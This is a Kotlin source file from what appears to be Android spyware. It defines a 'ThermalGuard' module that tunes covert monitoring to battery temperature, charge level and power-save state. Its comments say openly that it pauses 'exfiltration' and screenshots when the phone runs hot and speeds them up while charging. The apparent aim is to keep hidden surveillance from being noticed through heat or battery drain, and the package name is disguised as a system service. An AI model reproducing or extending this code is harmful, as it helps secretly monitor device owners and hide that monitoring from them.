package com.system.service.core

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.BatteryManager
import android.os.Handler
import android.os.Looper
import android.os.PowerManager

/**
 * ThermalGuard — protects the device from overheating by throttling
 * monitoring intensity based on battery temperature and device state.
 *
 * Thermal Levels:
 *   NORMAL   (< 38°C)  — Full speed, all monitors active
 *   WARM     (38-42°C) — Reduced sync frequency, longer jitter delays
 *   HOT      (42-45°C) — Screenshots disabled, exfiltration paused
 *   CRITICAL (> 45°C)  — All monitoring paused until cooldown
 *
 * Also monitors:
 *   • Battery level — reduces activity below 15%
 *   • Charging state — allows more aggressive monitoring while charging
 *   • Power save mode — throttles when system power saver is on
 */
object ThermalGuard {

    enum class ThermalLevel {
        NORMAL,   // Full speed
        WARM,     // Throttled sync
        HOT,      // Screenshots off, sync paused
        CRITICAL  // All monitoring paused
    }

    // Temperature thresholds in °C (tenths from BatteryManager)
    private const val TEMP_WARM = 380       // 38.0°C
    private const val TEMP_HOT = 420        // 42.0°C
    private const val TEMP_CRITICAL = 450   // 45.0°C
    private const val TEMP_COOLDOWN = 370   // 37.0°C (resume threshold)

    private const val BATTERY_LOW = 15      // 15% — reduce activity
    private const val BATTERY_CRITICAL = 5  // 5% — minimal activity only

    private const val CHECK_INTERVAL_MS = 30_000L  // Check every 30 seconds

    @Volatile
    var currentLevel = ThermalLevel.NORMAL
        private set

    @Volatile
    var batteryTemp: Float = 0f      // Current temp in °C
        private set

    @Volatile
    var batteryLevel: Int = 100
        private set

    @Volatile
    var isCharging: Boolean = false
        private set

    @Volatile
    var isPowerSaveMode: Boolean = false
        private set

    /** Whether screenshots should be taken (disabled when HOT or above). */
    val screenshotsAllowed: Boolean
        get() = if (!Config.batteryOptimizationEnabled) true else (currentLevel == ThermalLevel.NORMAL || currentLevel == ThermalLevel.WARM)

    /** Whether network exfiltration should happen (disabled when HOT or above). */
    val syncAllowed: Boolean
        get() = if (!Config.batteryOptimizationEnabled) true else (currentLevel == ThermalLevel.NORMAL ||
                (currentLevel == ThermalLevel.WARM && !isPowerSaveMode))

    /** Whether any monitoring should be active (disabled when CRITICAL). */
    val monitoringAllowed: Boolean
        get() = if (!Config.batteryOptimizationEnabled) true else currentLevel != ThermalLevel.CRITICAL

    /** Sync delay multiplier based on thermal state. */
    val syncDelayMultiplier: Float
        get() = when {
            currentLevel == ThermalLevel.WARM -> 2.0f
            isCharging -> 0.8f
            batteryLevel < BATTERY_LOW -> 3.0f
            batteryLevel < BATTERY_CRITICAL -> 5.0f
            isPowerSaveMode -> 2.5f
            else -> 1.0f
        }

    private var handler: Handler? = null
    private var context: Context? = null
    private var batteryReceiver: BroadcastReceiver? = null
    private var listener: ThermalListener? = null

    interface ThermalListener {
        fun onThermalLevelChanged(oldLevel: ThermalLevel, newLevel: ThermalLevel)
    }

    fun start(ctx: Context, thermalListener: ThermalListener? = null) {
        context = ctx.applicationContext
        listener = thermalListener
        handler = Handler(Looper.getMainLooper())

        // Register battery receiver
        batteryReceiver = object : BroadcastReceiver() {
            override fun onReceive(context: Context?, intent: Intent?) {
                intent?.let { updateBatteryState(it) }
            }
        }
        val filter = IntentFilter().apply {
            addAction(Intent.ACTION_BATTERY_CHANGED)
            addAction(PowerManager.ACTION_POWER_SAVE_MODE_CHANGED)
        }
        ctx.registerReceiver(batteryReceiver, filter)

        // Initial state check
        val batteryIntent = ctx.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        batteryIntent?.let { updateBatteryState(it) }

        // Check power save mode
        val pm = ctx.getSystemService(Context.POWER_SERVICE) as PowerManager
        isPowerSaveMode = pm.isPowerSaveMode

        // Start periodic checks
        startPeriodicCheck()
    }

    fun stop() {
        handler?.removeCallbacksAndMessages(null)
        handler = null
        batteryReceiver?.let { context?.unregisterReceiver(it) }
        batteryReceiver = null
        context = null
        listener = null
        currentLevel = ThermalLevel.NORMAL
    }

    private fun updateBatteryState(intent: Intent) {
        when (intent.action) {
            Intent.ACTION_BATTERY_CHANGED -> {
                // Temperature in tenths of °C
                val tempRaw = intent.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, 0)
                batteryTemp = tempRaw / 10f

                // Battery level
                val level = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
                val scale = intent.getIntExtra(BatteryManager.EXTRA_SCALE, -1)
                batteryLevel = if (scale > 0) (level * 100) / scale else 100

                // Charging state
                val status = intent.getIntExtra(BatteryManager.EXTRA_STATUS, -1)
                isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING ||
                        status == BatteryManager.BATTERY_STATUS_FULL

                evaluateThermalLevel(tempRaw)
            }

            PowerManager.ACTION_POWER_SAVE_MODE_CHANGED -> {
                val pm = context?.getSystemService(Context.POWER_SERVICE) as? PowerManager
                isPowerSaveMode = pm?.isPowerSaveMode ?: false
            }
        }
    }

    private fun evaluateThermalLevel(tempRaw: Int) {
        val oldLevel = currentLevel

        currentLevel = when {
            tempRaw >= TEMP_CRITICAL -> ThermalLevel.CRITICAL
            tempRaw >= TEMP_HOT -> ThermalLevel.HOT
            tempRaw >= TEMP_WARM -> ThermalLevel.WARM
            // Hysteresis: stay at WARM until we drop below COOLDOWN threshold
            oldLevel == ThermalLevel.WARM && tempRaw > TEMP_COOLDOWN -> ThermalLevel.WARM
            else -> ThermalLevel.NORMAL
        }

        if (oldLevel != currentLevel) {
            listener?.onThermalLevelChanged(oldLevel, currentLevel)
        }
    }

    private fun startPeriodicCheck() {
        val runnable = object : Runnable {
            override fun run() {
                // Re-read battery state
                val batteryIntent = context?.registerReceiver(
                    null, IntentFilter(Intent.ACTION_BATTERY_CHANGED)
                )
                batteryIntent?.let { updateBatteryState(it) }

                handler?.postDelayed(this, CHECK_INTERVAL_MS)
            }
        }
        handler?.postDelayed(runnable, CHECK_INTERVAL_MS)
    }

    /** Get a human-readable status string. */
    fun statusString(): String {
        val emoji = when (currentLevel) {
            ThermalLevel.NORMAL -> "🟢"
            ThermalLevel.WARM -> "🟡"
            ThermalLevel.HOT -> "🟠"
            ThermalLevel.CRITICAL -> "🔴"
        }
        return "$emoji ${currentLevel.name} | ${batteryTemp}°C | ${batteryLevel}% | " +
                "${if (isCharging) "⚡" else "🔋"} | " +
                "${if (isPowerSaveMode) "🔋SaverON" else ""}"
    }
}
